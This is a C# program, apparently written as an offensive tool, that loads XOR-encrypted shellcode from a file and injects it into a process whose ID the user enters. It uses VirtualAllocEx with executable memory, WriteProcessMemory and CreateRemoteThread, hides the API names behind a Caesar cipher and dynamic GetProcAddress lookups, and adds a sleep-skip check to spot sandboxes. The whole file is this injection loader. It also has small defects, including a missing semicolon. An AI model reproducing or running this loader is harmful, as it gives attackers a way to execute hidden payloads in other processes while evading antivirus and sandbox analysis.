using System;
using System.IO;
using System.Runtime.InteropServices;

class Program
{
	[DllImport("kernel32.dll", SetLastError=true)]
	private static extern IntPtr OpenProcess(uint dwDesiredAcess, bool bInheritHandle, uint processId);
	
	[DllImport("kernel32.dll", SetLastError=true)]
	private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
	
	[DllImport("kernel32.dll", SetLastError=true)]
	private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nsize,out uint lpNumberofBytesWritten);
	
	[DllImport("kernel32.dll", SetLastError=true)]
	private static extern IntPtr CreateRemoteThread(IntPtr hProcess,IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
	 
	[DllImport("kernel32.dll", SetLastError=true)]
	private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
	
	[DllImport("kernel32.dll", SetLastError=true)]
	private static extern bool CloseHandle(IntPtr hObject);
	
	[DllImport("kernel32.dll", SetLastError=true)]
	private static extern long GetTickCount64();
	
	
	[DllImport("kernel32.dll", SetLastError=true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);
	
	
	
	[DllImport("kernel32.dll",SetLastError=true)]
	private static extern IntPtr GetProcAddress(IntPtr hModule,string lpProcName);
	
	
	
	//[DllImport("kernel32.dll", SetLastError=true)]
	//[return: MarshalAs (UnmanagedType.Bool)]
	//public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
	
	
	
	delegate IntPtr OpenProcessDelegate(uint dwDesiredAcess, bool bInheritHandle, uint processId);
	delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
	delegate bool WriteProcessMemoryDelegate (IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
	delegate IntPtr CreateRemoteThreadDelegate(IntPtr hProcess,IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
	
	
	static void CaesarDecrypt(char[]str, int key){
		for(int i=0;i<str.Length;i++){
			char ch=str[i];
			if(char.IsLetter(ch)){
				if(char.IsLower(ch)){
					ch=(char)(((ch-'a' -key +26)%26) +'a');
				}
				else{
					ch=(char)(((ch-'A' -key +26)%26) +'A');
				}
				str[i]=ch;
			}
		}
	}
	
	static string EncryptCaesar(String ip, int key){
		
		char[] chars=ip.ToCharArray();
		for(int i=0;i<chars.Length;i++)
		{
			char c=chars[i];
			if(char.IsLetter(c)){
				char offset=char.IsUpper(c)?'A':'a';
				chars[i]=(char)(((c+key-offset)%26)+offset);
			}
		}
		return new string(chars);
	}
	
	
	static void Main(string[] args)
	{
		//read encrypted shellcode from file
		byte[] encryptedShellcode;
		using (FileStream fs = new FileStream("encrypted_shellcode.bin", FileMode.Open,FileAccess.Read)){
			encryptedShellcode= new byte[fs.Length];
			fs.Read(encryptedShellcode,0,encryptedShellcode.Length)
		}
		
		//read key from file
		byte[]key;
		using (FileStream fs = new FileStream("key.bin", FileMode.Open,FileAccess.Read)){
			key=new byte[fs.Length];
			fs.Read(key,0,key.Length);
		}
		
		//perform XOR decryption
		byte[] buf=new byte[encryptedShellcode.Length];
		for(int i=0;i<encryptedShellcode.Length;i++)
		{
			buf[i]=(byte)(encryptedShellcode[i] ^ key [i%key.Length]);
		}
		
		//encrypt func names
		string eva=EncryptCaesar("VirtualAllocEx",111);
		string emm=EncryptCaesar("OpenProcess",111);
		string ect=EncryptCaesar("CreateRemoteThread",111);
		string ebt=EncryptCaesar("WriteProcessMemory",111);
		
		//decrypt func name in memory
		CaesarDecrypt(eva.ToCharArray(),111);
		CaesarDecrypt(emm.ToCharArray(),111);
		CaesarDecrypt(ect.ToCharArray(),111);
		CaesarDecrypt(ebt.ToCharArray(),111);
		
		//dynamically load functions
		OpenProcessDelegate OpenProcessFn= (OpenProcessDelegate) Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), emm), typeof(OpenProcessDelegate));
		VirtualAllocExDelegate VirtualAllocExFn= (VirtualAllocExDelegate) Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), eva), typeof(VirtualAllocExDelegate));
		CreateRemoteThreadDelegate CreateRemoteThreadFn= (CreateRemoteThreadDelegate) Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), ect), typeof(CreateRemoteThreadDelegate));
		WriteProcessMemoryDelegate WriteProcessMemoryFn= (WriteProcessMemoryDelegate) Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), ebt), typeof(WriteProcessMemoryDelegate));
		
		
		
		
		//check of sleep skips
		long initalTickC=GetTickCount64();
		System.Threading.Thread.Sleep(2000); //sleep for 2 sec
		long currentTickC=GetTickCount64();
		if(currentTickC-initalTickC <2000){
			Console.WriteLine("Sleep was skipped");
		}else{
			Console.WriteLine("Sleep wasnt skipped");
		}
		
		//human text	
		Console.Write("enter process id to inject: ");
		uint processId=uint.Parse(Console.ReadLine());
		
		//open the process
		IntPtr hProcess=OpenProcessFn(0x1F0FFF,false,processId);
		if(hProcess==IntPtr.Zero)
		{
			Console.WriteLine("Failed to open process. Error code: "+Marshal.GetLastWin32Error());
			return;
		}
		
		Console.WriteLine("Got procHandle: "+hProcess);
		
		
		
		//allocate memory for shellcode in target process
		IntPtr mem= VirtualAllocExFn(hProcess,IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x40);
		if(mem==IntPtr.Zero){
			Console.WriteLine("Failed to allocate memory");
			CloseHandle(hProcess);
			return;
		}
		
		//copy shellcode to allocated memory
		uint bytesWritten;
		if(!WriteProcessMemoryFn(hProcess, mem,buf,(uint)buf.Length,out bytesWritten)){
			Console.WriteLine("WriteProcessMemory Failed");
			CloseHandle(hProcess);
			return;
		}
		
		
		//execute shellcode in a new thread
		uint threadId;
		IntPtr thread = CreateRemoteThreadFn(hProcess, IntPtr.Zero,0, mem, IntPtr.Zero, 0, out threadId);
		if(thread == IntPtr.Zero){
			Console.WriteLine("Failed to create thread");
			CloseHandle(hProcess);
			return;
		}
		
		//wait for thread to finish
		WaitForSingleObject(thread, 0xFFFFFFFF);
		
		//cleanup
		CloseHandle(thread);
		CloseHandle(hProcess);
		
		Console.WriteLine("Execution completed");
	}
}


